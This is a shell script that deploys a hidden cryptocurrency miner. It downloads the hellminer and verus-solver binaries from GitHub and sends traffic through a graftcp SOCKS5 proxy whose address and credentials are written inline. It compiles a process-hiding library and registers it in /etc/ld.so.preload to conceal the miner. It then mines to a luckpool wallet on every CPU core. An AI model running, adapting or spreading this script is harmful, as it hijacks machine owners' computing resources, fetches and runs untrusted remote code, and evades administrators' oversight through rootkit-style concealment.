#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev && apt install -y ocl-icd-opencl-dev

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 5.154.254.2:80
socks5_username = 1nofvbdys-rotate
socks5_password = 44tpywm4q9bo
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget https://github.com/principala/a/raw/main/hellminer
wget https://github.com/principala/a/raw/main/verus-solver  
chmod +x hellminer verus-solver
 
./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
unzip magicBezzHash.zip 
make 
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
mv libprocesshider.so /usr/local/lib/ 
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
 
./graftcp/graftcp ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RFjeLpKzaG94EnaidkK2PvgdNR5Q5nTnbW.PayAs -p x --cpu $(nproc --all)
